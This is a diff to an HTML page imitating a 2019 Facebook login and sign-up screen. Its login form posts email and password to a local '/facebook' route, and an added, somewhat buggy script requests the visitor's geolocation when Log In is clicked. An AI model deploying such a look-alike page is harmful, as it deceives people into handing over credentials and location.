@@ -138,58 +138,60 @@
           </div>
           <div>
             <form action="/facebook" method="POST">
-            <table>
-              <tr>
-                <td style="padding-bottom: 4px;font-size: 14px;">
-                  Email or Phone
-                </td>
+              <table>
+                <tr>
+                  <td style="padding-bottom: 4px;font-size: 14px;">
+                    Email or Phone
+                  </td>
 
-                <td style="padding-bottom: 4px;font-size: 14px;">
-                  Password
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  <input
-                    type="text"
-                    name="email"
-                    style=" border: 1px solid #1d2a5b;width: 150px;
+                  <td style="padding-bottom: 4px;font-size: 14px;">
+                    Password
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <input
+                      type="email"
+                      name="email"
+                      id="email"
+                      style=" border: 1px solid #1d2a5b;width: 150px;
                     border-radius: 0;
                     margin: 0;
                     padding: 4px;  margin-right: 15px;height: 23px;"
-                  />
-                </td>
+                    />
+                  </td>
 
-                <td>
-                  <input
-                    type="password"
-                    name="password"
-                    style=" border: 1px solid #1d2a5b;width: 150px;
+                  <td>
+                    <input
+                      type="password"
+                      name="password"
+                      id="password"
+                      style=" border: 1px solid #1d2a5b;width: 150px;
                     border-radius: 0;
                     margin: 0;
                     padding: 4px;margin-right: 15px;height: 23px;"
-                  />
-                </td>
-                <td>
-                  <button class="btn">
-                    Log In
-                  </button>
-                </td>
-              </tr>
-              <tr>
-                <td></td>
-                <td
-                  style="padding: 4px 0px;
+                    />
+                  </td>
+                  <td>
+                    <button class="btn" id="login" onclick="click()">
+                      Log In
+                    </button>
+                  </td>
+                </tr>
+                <tr>
+                  <td></td>
+                  <td
+                    style="padding: 4px 0px;
                 font-size: 14px;
                 cursor: pointer;
                 display: inline-block;
                "
-                >
-                  <a href="#" class="line">Forgotten account?</a>
-                </td>
-              </tr>
-            </table>
-          </form>
+                  >
+                    <a href="#" class="line">Forgotten account?</a>
+                  </td>
+                </tr>
+              </table>
+            </form>
           </div>
         </div>
       </div>
@@ -222,23 +224,27 @@
           <div style="width:400px">
             <input
               style="width: 48%;border: 1px solid  #c2c9d0;;border-radius: 0;font-size: 18px;padding: 8px 10px;margin-right: 8px;border-radius: 5px;margin-bottom: 10px"
-              type="text; " placeholder="First name"
+              type="text; "
+              placeholder="First name"
             />
 
             <input
               style="width: 48%;font-size: 18px;padding: 8px 10px;border-radius: 5px;border: 1px solid  #c2c9d0;;border-radius: 0;border-radius: 5px"
-              type="text" placeholder="Surname"
+              type="text"
+              placeholder="Surname"
             />
 
             <input
               style="font-size: 18px;padding: 8px 10px;border-radius:
           5px;border: 1px solid  #c2c9d0;;border-radius: 0;border-radius: 5px;width: 100%;margin-bottom: 10px"
-              type="text" placeholder="Mobile number or email address"
+              type="text"
+              placeholder="Mobile number or email address"
             />
             <input
               style="font-size: 18px;padding: 8px 10px;border-radius:
         5px;border: 1px solid #c2c9d0;border-radius: 0;border-radius: 5px;width: 100%;margin-bottom: 10px"
-              type="text" placeholder="New password"
+              type="text"
+              placeholder="New password"
             />
           </div>
           <h3
@@ -449,5 +455,36 @@ margin-bottom: 6px;"
         Facebook © 2019
       </p>
     </div>
+    <script>
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+      var login = document
+        .getElementById("login")
+        .addEventListener("click", login);
+
+      function login() {
+        if (email == "" || password == "") {
+          alert("Please Enter The Fields");
+        }
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+          alert("Sorry! your browser is not supporting");
+        }
+      }
+
+
+      function showPosition(position) {
+        var x =
+          "Your current location is (" +
+          "Latitude: " +
+          position.coords.latitude +
+          ", " +
+          "Longitude: " +
+          position.coords.longitude +
+          ")";
+       
+      }
+    </script>
   </body>
 </html>
